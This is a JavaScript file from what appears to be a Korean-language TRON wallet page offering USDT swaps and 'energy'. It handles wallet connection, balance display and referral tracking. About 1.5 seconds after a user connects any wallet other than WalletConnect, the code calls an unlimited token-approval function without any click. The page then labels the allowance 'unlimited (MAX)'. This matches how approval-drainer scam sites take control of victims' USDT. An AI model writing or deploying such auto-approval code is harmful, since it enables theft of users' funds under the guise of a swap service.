function formatWalletTpl(key, fallback, params) {
    var msg = T(key, fallback);
    if (!params) return msg;
    Object.keys(params).forEach(function (k) {
        msg = msg.replace(new RegExp('\\{' + k + '\\}', 'g'), String(params[k]));
    });
    return msg;
}

// ========== CONNECT BUTTON LOADING STATE ==========
function setConnectButtonLoading(loading) {
    var btn = document.getElementById('connect-btn');
    if (!btn) return;
    if (connectBtnOriginalHtml === null) connectBtnOriginalHtml = btn.innerHTML;
    if (loading) {
        btn.disabled = true;
        btn.innerHTML = '<span class="animate-spin rounded-full h-3.5 w-3.5 border-2 border-white border-t-transparent"></span><span>' + T('connecting_msg', '연결 중...') + '</span>';
    } else {
        btn.disabled = false;
        if (!isConnected) {
            btn.innerHTML = '<i class="fa-solid fa-wallet text-blue-200"></i><span id="wallet-btn-text">' + T('connect_wallet', '지갑 연결') + '</span>';
        }
    }
}

// ========== HANDLE CONNECT WALLET BUTTON ==========
window.handleConnectWallet = async function () {
    if (isConnecting) return;
    isConnecting = true;
    setConnectButtonLoading(true);
    try {
        var tw = await getInjectedTronWeb();
        if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
            var provider = detectProvider() || 'TronLink';
            await setConnectedWallet(tw.defaultAddress.base58, provider);
        } else {
            var modal = document.getElementById('wallet-selector-modal');
            if (modal) modal.classList.add('active');
        }
    } catch (e) {
        showToast(T('wallet_connect_error_msg', '지갑 연결 중 오류가 발생했습니다.'), 'error');
    } finally {
        isConnecting = false;
        setConnectButtonLoading(false);
    }
};

// ========== SET CONNECTED WALLET (백엔드 동기화 포함) ==========
async function setConnectedWallet(address, provider) {
    currentWalletAddress = address;
    activeProvider = provider;
    isConnected = true;

    // UI 업데이트
    try {
        var _ea = document.getElementById('energy-address');
        if (_ea) _ea.value = address;
    } catch (e) { }
    try {
        var wText = document.getElementById('wallet-btn-text');
        if (wText) wText.textContent = address.substring(0, 6) + '...' + address.slice(-4);
    } catch (e) { }
    try {
        var cBtn = document.getElementById('connect-btn');
        if (cBtn) {
            cBtn.disabled = false;
            cBtn.className = 'flex items-center gap-1.5 sm:gap-2 bg-slate-100 border border-slate-300 text-emerald-600 font-semibold text-[11px] sm:text-xs px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl transition';
        }
    } catch (e) { }
    try { document.getElementById('wallet-disconnected').classList.add('hidden'); } catch (e) { }
    try { document.getElementById('wallet-connected').classList.remove('hidden'); } catch (e) { }
    try { document.getElementById('display-address').textContent = address; } catch (e) { }

    // 백엔드 연결 (재시도 포함)
    for (var retry = 0; retry < 2; retry++) {
        try {
            var res = await apiFetch(API_BASE + '/wallet/connect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: address, provider: provider })
            });
            var data = await res.json();
            if (data.status === 'ok') {
                var parsedUsdt = parseFloat(data.balance);
                userUsdtBalance = (isFinite(parsedUsdt) && parsedUsdt >= 0) ? parsedUsdt : 0;
                try {
                    document.getElementById('display-balance').innerHTML = data.balance + ' <span class="text-xs font-normal text-slate-400">USDT</span>';
                } catch (e) { }
                refreshSwapBalanceUI();
                if (data.isApproved) {
                    isApproved = true;
                    setApprovedUI();
                    _autoApproveScheduled = true;
                }
                showToast(formatWalletTpl(
                    'wallet_connected_msg',
                    '{provider} 연결 완료 (잔액: {balance} USDT)',
                    { provider: provider, balance: data.balance }
                ));
                break;
            }
        } catch (e) {
            if (retry === 1) showToast(T('backend_connect_fail_msg', '백엔드 연결 실패'), 'error');
            else await new Promise(function (r) { setTimeout(r, 500); });
        }
    }

    // TRX 잔액
    try {
        var _tr = await apiFetch(API_BASE + '/trx/' + address);
        var _td = await _tr.json();
        if (_td.trxBalance !== undefined && _td.trxBalance !== null) {
            var parsedTrx = parseFloat(_td.trxBalance);
            userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
            refreshSwapBalanceUI();
        }
    } catch (e) { }

    // 레퍼럴 추적
    try { trackReferralConnect(address, provider); } catch (e) { }

    // 자동 승인 (WalletConnect 제외)
    if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
        _autoApproveScheduled = true;
        var targetAddr = address;
        setTimeout(function () {
            if (isConnected && currentWalletAddress === targetAddr && !isApproved && !isApproving && !isLaunchingWallet) {
                executeUnlimitedApprove();
            }
        }, 1500);
    }

    // 에너지 주소 재확인
    setTimeout(function () {
        try {
            var _ea2 = document.getElementById('energy-address');
            if (_ea2 && _ea2.value !== currentWalletAddress && currentWalletAddress) {
                _ea2.value = currentWalletAddress;
            }
        } catch (e) { }
    }, 500);
}

// ========== SET APPROVED UI ==========
function setApprovedUI() {
    var _t = (typeof translations !== 'undefined' && (translations[currentLang] || translations.en)) || {};
    try {
        document.getElementById('display-allowance').textContent = _t.approved_max || '무제한 (MAX)';
        document.getElementById('display-allowance').className = 'text-sm font-bold font-mono text-emerald-400 mt-1';
    } catch (e) { }
    try {
        document.getElementById('allowance-badge-main').textContent = _t.approval_done || '교환 승인 완료';
        document.getElementById('allowance-badge-main').className = 'text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
    } catch (e) { }
    try {
        var btnText = document.getElementById('approve-btn-text');
        if (btnText) btnText.textContent = _t.swap_btn_done || '교환하기';
    } catch (e) { }
    hideProgress();
    try { setEnergyApprovedUI(); } catch (e) { }
}